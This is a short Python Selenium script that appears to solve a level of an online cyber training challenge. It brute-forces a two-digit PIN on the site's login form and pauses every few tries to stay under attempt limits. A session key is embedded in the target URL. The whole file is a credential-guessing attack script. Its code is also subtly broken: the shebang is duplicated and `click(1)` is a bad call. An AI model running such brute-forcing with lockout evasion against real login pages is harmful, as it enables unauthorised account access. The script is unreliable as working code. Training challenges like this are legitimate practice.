#!/usr/bin/env python3
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#<a href="/login" class="btn" style="background-color: #ff6000; color: #ffffff;">Guess the pin »</a>
#<input type="text" name="pin" class="form-control" placeholder="" value="" style="width:100%; margin-right:10px;">
#<button type="submit" class="btn" style="background-color:#ff6000; color:#ffffff; margin-bottom: 50px;">Sign In</button>
#<a href="/login" class="btn" style="background-color: #ff6000; color: #ffffff;">Enter Level 3 »</a>
#

import string
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
attempts = 0
attemptsallowed = 5
timetosleep = 5
webpage3 = "http://103.cybertrial.co.uk/login?mykey=a39KvztnMHrEqdXrhyuZddZPmTrLqEcqWRRwrhk4"
DigPoss = string.digits
driver = webdriver.Firefox()
driver.get(webpage3)

eltest = driver.find_element_by_class_name('btn') #driver.find_elements_by_xpath("//*[contains(text(), 'Guess the pin')]")
eltest.click(1)
time.sleep(200)
try:
    elementbtn = driver.find_element_by_class_name("btn")
except:
    time.sleep(timetosleep)
    elementbtn = driver.find_element_by_class_name("btn")
elementbtn.click()


for i in DigPoss:
    for j in DigPoss:
        print("Using:", i)
        print("Using:", j)
        conc = str(i) + str(j)
        elementpin = driver.find_element_by_name("pin") #.find_element_by_id("email")
        elementpin.send_keys(conc)
        elementpin.send_keys(Keys.RETURN)
        if (attempts < attemptsallowed):
            attempts +=1
            time.sleep(2)
        else:
            attempts = 0
            time.sleep(timetosleep)